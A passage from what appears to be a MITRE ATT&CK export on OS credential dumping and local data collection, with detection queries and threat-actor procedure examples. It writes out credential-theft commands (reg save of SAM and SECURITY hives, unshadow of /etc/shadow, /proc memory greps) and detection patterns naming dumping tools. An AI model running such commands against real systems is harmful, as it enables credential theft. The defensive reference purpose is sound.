    "Description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with thenet usercommand. Enumerating the SAM database requires SYSTEM level access.A number of tools can be used to retrieve the SAM file through in-memory techniques:pwdumpx.exegsecdumpMimikatzsecretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:reg save HKLM\\sam samreg save HKLM\\system systemCreddump7 can then be used to process the SAM database locally to retrieve hashes.[1]Notes:RID 500 account is the local, built-in administrator.RID 501 is the guest account.User accounts start with a RID of 1,000+.",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored.Analytic 1 - Unauthorized attempts to dump SAM database through command execution.index=security sourcetype=\"Powershell\" EventCode=4104 Image=\"powershell.exe\" CommandLine IN (\"Invoke-Mimikatz\", \"Invoke-SAMDump\", \"reg save hklm\\sam\", \"reg.exe save hklm\\sam*\")",
      "Monitor for hash dumpers opening the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM). Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromisedValid Accountsin-use by adversaries may help as well.Analytic 1 - Unauthorized access to SAM database.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"*\\config\\SAM\" | where ProcessName IN (\"reg.exe\", \"powershell.exe\", \"wmic.exe\", \"schtasks.exe\", \"cmd.exe\", \"rundll32.exe\", \"mimikatz.exe\", \"procdump.exe\")",
      "Monitor newly constructed files being written with default names that have extracted credentials from the Security Account Manager.Analytic 1 - Creation of files with extracted SAM credentials.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName IN (\"\\config\\SAM\", \"\\config\\system\", \"\\config\\security\", \"\\system32\\config\\sam\", \"\\system32\\config\\system\", \"\\system32\\config\\security\") | where ProcessName IN (\"reg.exe\", \"powershell.exe\", \"wmic.exe\", \"schtasks.exe\", \"cmd.exe\", \"rundll32.exe\", \"mimikatz.exe\", \"procdump.exe\")",
      "Monitor for the SAM registry key dump being created to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromisedValid Accountsin-use by adversaries may help as well.Analytic 1 - Unauthorized registry access to SAM key.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"*\\SAM\" | where ProcessName IN (\"reg.exe\", \"powershell.exe\", \"wmic.exe\", \"schtasks.exe\", \"cmd.exe\", \"rundll32.exe\", \"mimikatz.exe\", \"procdump.exe\")"
    ],
    "Procedure Examples": [
      "Agriusdumped the SAM file on victim machines to capture credentials.[2]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28used the following commands to dump SAM, SYSTEM, and SECURITY hives:reg save hklm\\sam, reg save hklm\\system,andreg save hklm\\security.[3]",
      "APT29has used thereg savecommand to save registry hives.[4]",
      "APT41extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using thereg savecommand or by exploiting volume shadow copies.[5]",
      "APT5has copied and exfiltrated the SAM Registry hive from targeted systems.[6]",
      "DuringC0017,APT41copied theSAMandSYSTEMRegistry hives for credential harvesting.[7]",
      "Cobalt Strikecan recover hashed passwords.[8]",
      "CosmicDukecollects Windows account hashes.[9]",
      "Password stealer and NTLM stealer modules inCozyCarharvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.[10]",
      "CrackMapExeccan dump usernames and hashed passwords from the SAM.[11]",
      "DaggerflyusedRegto dump the Security Account Manager (SAM) hive from victim machines for follow-on credential extraction.[12]",
      "Dragonflyhas dropped and executed SecretsDump to dump password hashes.[13]",
      "Ember Bearacquires victim credentials by extracting registry hives such as the Security Account Manager through commands such asreg save.[14][15]",
      "Fgdumpcan dump Windows password hashes.[16]",
      "FIN13has extracted the SAM and SYSTEM registry hives using thereg.exebinary for obtaining password hashes from a compromised machine.[17]",
      "DuringFrostyGoop Incident, the adversary retrieved the contents of the Security Account Manager (SAM) hive in the victim environment for credential capture.[18]",
      "GALLIUMusedregcommands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.[19]",
      "gsecdumpcan dump Windows password hashes from the SAM.[20]",
      "HOPLIGHThas the capability to harvest credentials and passwords from the SAM database.[21]",
      "IceApple's Credential Dumper module can dump encrypted password hashes from SAM registry keys, includingHKLM\\SAM\\SAM\\Domains\\Account\\FandHKLM\\SAM\\SAM\\Domains\\Account\\Users\\*\\V.[22]",
      "SecretsDump andMimikatzmodules withinImpacketcan perform credential dumping to obtain account and password information.[23]",
      "Ke3changhas dumped credentials, including by using gsecdump.[24][25]",
      "Koadiccan gather hashed passwords by dumping SAM/SECURITY hive.[26]",
      "menuPasshas used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[27][28]",
      "Mimikatzperforms credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table.[29][30][31][32]",
      "Mivasthas the capability to gather NTLM password information.[33]",
      "DuringNight Dragon, threat actors dumped account hashes usinggsecdump.[34]",
      "DuringOperation CuckooBees, the threat actors leveraged a custom tool to dump OS credentials and used following commands:reg save HKLM\\\\SYSTEM system.hiv,reg save HKLM\\\\SAM sam.hiv, andreg save HKLM\\\\SECURITY security.hiv, to dump SAM, SYSTEM and SECURITY hives.[35]",
      "POWERTONhas the ability to dump password hashes.[36]",
      "pwdumpcan be used to dump credentials from the SAM.[37]",
      "Remseccan dump the SAM database.[38]",
      "Threat Group-3390actors have usedgsecdumpto dump credentials. They have also dumped credentials from domain controllers.[39][40]",
      "Wizard Spiderhas acquired credentials from the SAM/SECURITY registry hives.[41]"
    ]
  },
  "T1003.003": {
    "Name": "OS Credential Dumping:NTDS",
    "Description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in%SystemRoot%\\NTDS\\Ntds.ditof a domain controller.[1]In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.[2]The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.Volume Shadow Copysecretsdump.pyUsing the in-built Windows tool, ntdsutil.exeInvoke-NinjaCopy",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. Look for command-lines that invoke attempts to access or copy the NTDS.dit.Note: Events 4688 (Microsoft Windows Security Auditing) and 1 (Microsoft Windows Sysmon) provide context of commands and parameters being executed via creation of a new process. Event 800 (PowerShell) provides context of commands and parameters being executed via PowerShell. This detection is based on known Windows utilities commands and parameters that can be used to copy the ntds.dit file. It is recommended to keep the list of commands and parameters up to date.Analytic 1 - Command line attempt to access or create a copy of ntds.dit file((sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\"  EventCode=\"800\") AND((CommandLine LIKE \"%ntds%\" AND CommandLine LIKE \"%ntdsutil%\" AND CommandLine LIKE \"%create%\") OR (CommandLine LIKE \"%vssadmin%\" AND CommandLine LIKE \"%create%\" AND CommandLine LIKE \"%shadow%\") OR (CommandLine LIKE \"%copy%\" AND CommandLine LIKE \"%ntds.dit%\")))",
      "Monitor for access or copy of the NTDS.dit.Note: Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users requesting access or accessing file objects (ObjectType = File) such as C:\\Windows\\NTDS\\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. Access rights that allow read operations on file objects and its attributes are %%4416 Read file data, %%4419 Read extended file attributes, %%4423 Read file attributes. If you search for just the name of the file and not the entire directory, you may get access events related to the ntds.dit file within a snapshot or volume shadow copy.Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users creating or copying file objects (ObjectType = File) such as C:\\Windows\\NTDS\\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. In order to filter file creation events, filter access rigths %%4417 Write data to the file and %%4424 Write file attributes.Event 11 (Microsoft Windows Sysmon) provide context of processes and users creating or copying files. Unfortunately, this event provides context of the file being created or copied, but not the file being copied. A good starting point would be to look for new files created or copied with extension .dit.Analytic 1 - Active Directory Dumping via NTDSUtil(sourcetype=WinEventLog:Security EventCode IN (4656, 4663)) OR (sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"11\") ANDObjectType=\"File\" AND TargetFilename=\"*ntds.dit\" AND (AccessList=\"%%4416\" OR AccessList=\"%%4419\" OR AccessList=\"%%4417\" OR AccessList=\"%%4424\")"
    ],
    "Procedure Examples": [
      "APT28has used the ntdsutil.exe utility to export the Active Directory database for credential access.[3]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28dumped NTDS.dit through creating volume shadow copies viavssadmin.[4]",
      "APT41used ntdsutil to obtain a copy of the victim environmentntds.ditfile.[5]",
      "Chimerahas gathered the SYSTEM registry and ntds.dit files from target systems.[6]Chimeraspecifically has used the NtdsAudit tool to dump the password hashes of domain users viamsadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csvand used ntdsutil to copy the Active Directory database.[7]",
      "CrackMapExeccan dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy.[8]",
      "DuringCutting Edge, threat actors accessed and mounted virtual hard disk backups to extract ntds.dit.[9]",
      "Dragonflyhas dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers.[10][11]",
      "esentutlcan copyntds.ditusing the Volume Shadow Copy service.[12][13]",
      "FIN13has harvested the NTDS.DIT file and leveraged theImpackettool on the compromised domain controller to locally decrypt it.[14]",
      "FIN6has used Metasploit’sPsExecNTDSGRAB module to obtain a copy of the victim's Active Directory database.[15][16]",
      "Fox Kittenhas used Volume Shadow Copy to access credential information from NTDS.[17]",
      "HAFNIUMhas stolen copies of the Active Directory database (NTDS.DIT).[18][19]",
      "SecretsDump andMimikatzmodules withinImpacketcan perform credential dumping to obtain account and password information from NTDS.dit.[20]",
      "Ke3changhas used NTDSDump and other password dumping tools to gather credentials.[21]",
      "Koadiccan gather hashed passwords by gathering domain controller hashes from NTDS.[22]",
      "LAPSUS$has used Windows built-in toolntdsutilto extract the Active Directory (AD) database.[23]",
      "menuPasshas used Ntdsutil to dump credentials.[24]",
      "Mustang Pandahas used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file.Mustang Pandahas also usedreg saveon the SYSTEM file Registry location to help extract the NTDS.dit file.[25]",
      "DuringOperation MidnightEclipse, threat actors obtained active directory credentials via the NTDS.DIT file.[26]",
      "Sandworm Teamhas usedntdsutil.exeto back up the Active Directory database, likely for credential access.[27]",
      "Scattered Spiderhas extracted theNTDS.ditfile by creating volume shadow copies of virtual domain controller disks.[28]",
      "Volt Typhoonhas used ntds.util to create domain controller installation media containing usernames and password hashes.[29][30][31][32]",
      "Wizard Spiderhas gained access to credentials via exported copies of the ntds.dit Active Directory database.Wizard Spiderhas also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil.[33][34]"
    ]
  },
  "T1003.004": {
    "Name": "OS Credential Dumping:LSA Secrets",
    "Description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.[1][2][3]LSA secrets are stored in the registry atHKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. LSA secrets can also be dumped from memory.[4]Regcan be used to extract from the Registry.Mimikatzcan be used to extract secrets from memory.[4]",
    "Detects": [
      "Monitor executed commands and arguments that may access to a host may attempt to access Local Security Authority (LSA) secrets. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[36]which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Analytic 1 - Suspicious access to LSA secrets.index=security (sourcetype=\"Powershell\" EventCode=4104) Image=\"powershell.exe\" CommandLine IN (\"Invoke-Mimikatz\", \"Invoke-LSADump*\")",
      "Monitor for the LSA secrets are stored in the registry atHKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secretsbeing accessedAnalytic 1 - Unauthorized registry access to LSA secrets.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"\\Policy\\Secrets\" | where ProcessName IN (\"reg.exe\", \"powershell.exe\", \"wmic.exe\", \"schtasks.exe\", \"cmd.exe\", \"rundll32.exe\", \"mimikatz.exe\", \"procdump.exe\")"
    ],
    "Procedure Examples": [
      "AADInternalscan dump secrets from the Local Security Authority.[5]",
      "APT29has used thereg savecommand to extract LSA secrets offline.[6]",
      "APT33has used a variety of publicly available tools likeLaZagneto gather credentials.[7][8]",
      "CosmicDukecollects LSA secrets.[9]",
      "CrackMapExeccan dump hashed passwords from LSA secrets for the targeted system.[10]",
      "Dragonflyhas dropped and executed SecretsDump to dump password hashes.[11][12]",
      "Ember Bearhas used frameworks such asImpacketto dump LSA secrets for credential capture.[13]",
      "gsecdumpcan dump LSA secrets.[14]",
      "IceApple's Credential Dumper module can dump LSA secrets from registry keys, including:HKLM\\SECURITY\\Policy\\PolEKList\\default,HKLM\\SECURITY\\Policy\\Secrets\\*\\CurrVal, andHKLM\\SECURITY\\Policy\\Secrets\\*\\OldVal.[15]",
      "SecretsDump andMimikatzmodules withinImpacketcan perform credential dumping to obtain account and password information.[16]",
      "Ke3changhas dumped credentials, including by using gsecdump.[17][18]",
      "LaZagnecan perform credential dumping from LSA secrets to obtain account and password information.[19]",
      "Leafminerused several tools for retrieving login and password information, including LaZagne.[20]",
      "menuPasshas used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[21][22]",
      "Mimikatzperforms credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA.[23][24][25][26]",
      "MuddyWaterhas performed credential dumping withLaZagne.[27][28]",
      "OilRighas used credential dumping tools such asLaZagneto steal credentials to accounts logged into the compromised system and to Outlook Web Access.[29][30][31][32]",
      "Pupycan use Lazagne for harvesting credentials.[33]",
      "Threat Group-3390actors have usedgsecdumpto dump credentials. They have also dumped credentials from domain controllers.[34][35]"
    ]
  },
  "T1003.005": {
    "Name": "OS Credential Dumping:Cached Domain Credentials",
    "Description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.[1]On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.[2]The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requiresPassword Crackingto recover the plaintext password.[3]On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at/var/lib/sss/db/cache.[domain].ldbfor SSSD or/var/opt/quest/vas/authcache/vas_auth.vdbfor Quest. Adversaries can use utilities, such astdbdump, on these database files to dump the cached hashes and usePassword Crackingto obtain the plaintext password.[4]With SYSTEM or sudo access, the tools/utilities such asMimikatz,Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.[4]Note: Cached credentials for Windows Vista are derived using PBKDF2.[2]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.[1]. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[20]which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Detection of compromisedValid Accountsin-use by adversaries may help as well.Analytic 1 - Unusual access to cached domain credentials.(index=security sourcetype=\"Powershell\" EventCode=4104 Image=\"powershell.exe\" CommandLine IN (\"Invoke-Mimikatz\", \"Invoke-CachedCredentials\"))OR(index=security sourcetype=\"linux_secure\" (cmd IN (\"mimikatz\", \"cachedump*\")))"
    ],
    "Procedure Examples": [
      "APT33has used a variety of publicly available tools likeLaZagneto gather credentials.[5][6]",
      "Cachedumpcan extract cached password hashes from cache entry information.[7]",
      "LaZagnecan perform credential dumping from MSCache to obtain account and password information.[8]",
      "Leafminerused several tools for retrieving login and password information, including LaZagne.[9]",
      "MuddyWaterhas performed credential dumping withLaZagne.[10][11]",
      "OilRighas used credential dumping tools such asLaZagneto steal credentials to accounts logged into the compromised system and to Outlook Web Access.[12][13][14][15]",
      "Okrumwas seen using modified Quarks PwDump to perform credential dumping.[16]",
      "Pupycan use Lazagne for harvesting credentials.[17]"
    ]
  },
  "T1003.006": {
    "Name": "OS Credential Dumping:DCSync",
    "Description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)[1][2][3][4]to simulate the replication process from a remote domain controller using a technique called DCSync.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data[5]from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create aGolden Ticketfor use inPass the Ticket[6]or change an account's password as noted inAccount Manipulation.[7]DCSync functionality has been included in the \"lsadump\" module inMimikatz.[8]Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.[9]",
    "Detects": [
      "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.[1][2][3]Note: Domain controllers may not log replication requests originating from the default domain controller account.[22]Analytic 1 - Monitor for replication requests from IPs not associated with known domain controllers.index=security sourcetype=\"WinEventLog:Security\" EventCode=4662 AccessMask=0x100 guid IN (\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\", \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\", \"9923a32a-3607-11d2-b9be-0000f87a36b2\", \"89e95b76-444d-4c62-991a-0facbeda640c\")",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "DuringC0027,Scattered Spiderperformed domain replication.[10]",
      "Earth Luscahas used aDCSynccommand withMimikatzto retrieve credentials from an exploited controller.[11]",
      "LAPSUS$has used DCSync attacks to gather credentials for privilege escalation routines.[12]",
      "Mimikatzperforms credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync.[13][8][14][15][16]",
      "DuringOperation Wocao, threat actors usedMimikatz's DCSync to dump credentials from the memory of the targeted system.[17]",
      "During theSolarWinds Compromise,APT29used privileged accounts to replicate directory service data with domain controllers.[18][19][20]"
    ]
  },
  "T1003.007": {
    "Name": "OS Credential Dumping:Proc Filesystem",
    "Description": "Adversaries may gather credentials from the proc filesystem or/proc. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the/proc/<PID>/mapsfile shows how memory is mapped within the process’s virtual address space. And/proc/<PID>/mem, exposed for debugging purposes, provides access to the process’s virtual address space.[1][2]When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such asgrep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1, to look for fixed strings in memory structures or cached hashes.[3]When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.[4][5]If running as or with the permissions of a web browser, a process can search the/maps&/memlocations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
    "Detects": [
      "Monitor executed commands and arguments that may gather credentials from information stored in the Proc filesystem or/proc. For instance, adversaries may use regex patterns to search for process memory that may be exfiltrated or searched for credentials.[3][8]grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | grep -E 'heap|stack' | cut -d' ' -f 1grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1Analytic 1 - Unexpected access to /proc filesystem.index=os sourcetype=\"linux_audit\" command IN (\"grep -E '^[0-9a-f-]r' /proc//maps\", \"cat /proc//maps\", \"awk '{print $1}' /proc//maps\")",
      "Monitor for unexpected access to passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path/proc/\\/maps, where the\\directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.Analytic 1 - Unauthorized access to /proc filesystem.index=os sourcetype=\"linux_audit\" command IN (\"grep -E '^[0-9a-f-]r' /proc//maps\")"
    ],
    "Procedure Examples": [
      "LaZagnecan use the<PID>/mapsand<PID>/memfiles to identify regex patterns to dump cleartext passwords from the browser's process memory.[6][1]",
      "MimiPenguincan use the<PID>/mapsand<PID>/memfile to search for regex patterns and dump the process memory.[4][1]",
      "PACEMAKERhas the ability to extract credentials from OS memory.[7]"
    ]
  },
  "T1003.008": {
    "Name": "OS Credential Dumping:/etc/passwd and /etc/shadow",
    "Description": "Adversaries may attempt to dump the contents of/etc/passwdand/etc/shadowto enable offline password cracking. Most modern Linux operating systems use a combination of/etc/passwdand/etc/shadowto store user account information, including password hashes in/etc/shadow. By default,/etc/shadowis only readable by the root user.[1]Linux stores user information such as user ID, group ID, home directory path, and login shell in/etc/passwd. A \"user\" on the system may belong to a person or a service. All password hashes are stored in/etc/shadow- including entries for users with no passwords and users with locked or disabled accounts.[1]Adversaries may attempt to read or dump the/etc/passwdand/etc/shadowfiles on Linux systems via command line utilities such as thecatcommand.[2]Additionally, the Linux utilityunshadowcan be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db[3]. Since the user information stored in/etc/passwdare linked to the password hashes in/etc/shadow, an adversary would need to have access to both.",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to dump the contents of/etc/passwdand/etc/shadowto enable offline password cracking.Analytic 1 - Unexpected command execution involving /etc/passwd and /etc/shadow.index=os sourcetype=\"linux_audit\" command IN (\"cat /etc/passwd\", \"cat /etc/shadow\", \"grep /etc/passwd\", \"grep /etc/shadow\") | eval Command=command | eval TargetFile=case(match(Command, \".passwd.\"), \"/etc/passwd\", match(Command, \".shadow.\"), \"/etc/shadow\")",
      "Monitor for files being accessed that may attempt to dump the contents of/etc/passwdand/etc/shadowto enable offline password cracking. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access/etc/passwdand/etc/shadow, alerting on the pid, process name, and arguments of such programs.Analytic 1 - Unauthorized access to /etc/passwd and /etc/shadow.index=os sourcetype=\"linux_audit\" file IN (\"/etc/passwd\", \"/etc/shadow\")"
    ],
    "Procedure Examples": [
      "LaZagnecan obtain credential information from /etc/shadow using the shadow.py module.[4]",
      "DuringShadowRay, threat actors usedcat /etc/shadowto steal password hashes.[5]"
    ]
  },
  "T1005": {
    "Name": "Data from Local System",
    "Description": "Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using aCommand and Scripting Interpreter, such ascmdas well as aNetwork Device CLI, which have functionality to interact with the file system to gather information.[1]Adversaries may also useAutomated Collectionon the local system.",
    "Detects": [
      "Monitor executed commands and arguments that may search and collect local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such asWindows Management InstrumentationandPowerShell.For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users.",
      "Monitor for unexpected/abnormal access to files that may be malicious collection of local data, such as user files (pdf,.docx,.jpg, etc.) or local databases. On ESXi servers, this may include.vmdkand.vmsnfiles in the/vmfs/volumesdirectory.",
      "Monitor for API calls that may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.",
      "Monitor for newly executed processes that may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.  Data may also be acquired through Windows system management tools such asWindows Management InstrumentationandPowerShell."
    ],
    "Procedure Examples": [
      "Action RATcan collect local data from an infected machine.[2]",
      "Agriusgathered data from database and other critical servers in victim environments, then used wiping mechanisms as an anti-analysis and anti-forensics mechanism.[3]",
      "Amadeycan collect information from a compromised host.[4]",
      "Andarielhas collected large numbers of files from compromised network systems for later extraction.[5]",
      "AppleSeedcan collect data on a compromised host.[6][7]",
      "APT1has collected files from a local victim.[8]",
      "APT28has retrieved internal documents from machines inside victim environments, including by usingForfilesto stage documents before exfiltration.[9][10][11][12]",
      "APT29has stolen data from compromised hosts.[13]",
      "APT3will identify Microsoft Office documents on the victim's computer.[14]",
      "APT37has collected data from victims' local systems.[15]",
      "APT38has collected data from a compromised host.[16]",
      "APT39has used various tools to steal files from the compromised host.[17][18]",
      "APT41has uploaded files and data from a compromised host.[19]",
      "Aquatic Pandacaptured local Windows security event log data from victim machines using thewevtutilutility to extract contents to anevtxoutput file.[20]",
      "AuTo Stealercan collect data such as PowerPoint files, Word documents, Excel files, PDF files, text files, database files, and image files from an infected machine.[2]",
      "Axiomhas collected data from a compromised network.[21]",
      "BADFLICKhas uploaded files from victims' machines.[22]",
      "When it first starts,BADNEWScrawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[23][24]",
      "BadPatchcollects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.[25]",
      "Bandookcan collect local files from the system .[26]",
      "Bankshotcollects files from the local system.[27]",
      "Bazarcan retrieve information from the infected machine.[28]",
      "Bisonalhas collected information from a compromised host.[29]",
      "BlackMouldcan copy files on a compromised host.[30]",
      "BLINDINGCANhas uploaded files from victim machines.[31]",
      "BoxCaoncan upload files from a compromised host.[32]",
      "BRONZE BUTLERhas exfiltrated files stolen from local systems.[33]",
      "Brute Ratel C4has the ability to upload files from a compromised system.[34]",
      "Bumblebeecan capture and compress stolen credentials from the Registry and volume shadow copies.[35]",
      "DuringC0015, the threat actors obtained files and data from the compromised network.[36]",
      "DuringC0017,APT41collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.[37]",
      "DuringC0026, the threat actors collected documents from compromised hosts.[38]",
      "Calistocan collect data from user directories.[39]",
      "Caterpillar WebShellhas a module to collect information from the local database.[40]",
      "ccf32can collect files from a compromised host.[41]",
      "CharmPowercan collect data and files from a compromised host.[42]",
      "CHIMNEYSWEEPcan collect files from compromised hosts.[43]",
      "China Chopper's server component can upload local files.[44][45][46][47]",
      "Chrommmecan collect data from a local system.[48]",
      "Clamblingcan collect information from a compromised host.[49]",
      "Cobalt Strikecan collect data from a local system.[50][51]",
      "CookieMinerhas retrieved iPhone text messages from iTunes phone backup files.[52]",
      "CosmicDukesteals user files from local hard drives with file extensions that match a predefined list.[53]",
      "DuringCostaRicto, the threat actors collected data and files from compromised networks.[54]",
      "CreepyDrivecan upload files to C2 from victim machines.[55]",
      "Crimsoncan collect information from a compromised host.[56]",
      "Crutchcan exfiltrate files from compromised systems.[57]",
      "Cryptoisticcan retrieve files from the local file system.[58]",
      "CURIUMhas exfiltrated data from a compromised machine.[59]",
      "DuringCutting Edge, threat actors stole the running configuration and cache data from targeted Ivanti Connect Secure VPNs.[60][61]",
      "Cyclops Blinkcan upload files from a compromised host.[62]",
      "DanBotcan upload files from compromised hosts.[63]",
      "Dark Caracalcollected complete contents of the 'Pictures' folder from compromised Windows systems.[64]",
      "DarkGatehas stolensitemanager.xmlandrecentservers.xmlfrom%APPDATA%\\FileZilla\\if present.[65]",
      "DarkWatchmancan collect files from a compromised host.[66]",
      "DnsSystemcan upload files from infected machines after receiving a command withuploadddin the string.[67]",
      "Dragonflyhas collected data from local victim systems.[68]",
      "DRATzaruscan collect information from a compromised host.[69]",
      "Drovorubcan transfer files from the victim machine.[70]",
      "Dtrackcan collect a variety of information from victim machines.[71]",
      "DUSTTRAPcan gather data from infected systems.[72]",
      "Ember Beargathers victim system information such as enumerating the volume of a given device or extracting system and security event logs for analysis.[73][74]",
      "EnvyScoutcan collect sensitive NTLM material from a compromised host.[75]",
      "esentutlcan be used to collect data from local file systems.[76]",
      "FatDukecan copy files and directories from a compromised host.[77]",
      "FIN13has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration.[78][79]",
      "FIN6has collected and exfiltrated payment card data from compromised systems.[80][81][82]",
      "FIN7has collected files and other sensitive information from a compromised network.[83]",
      "Flagprocan collect data from a compromised host, including Windows authentication information.[84]",
      "FLASHFLOODsearches for interesting files (either a default or customized set of file extensions) on the local system.FLASHFLOODwill scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories.FLASHFLOODalso collects information stored in the Windows Address Book.[85]",
      "FlawedAmmyyhas collected information and files from a compromised machine.[86]",
      "FoggyWebcan retrieve configuration data from a compromised AD FS server.[87]",
      "Forfilescan be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).[9]",
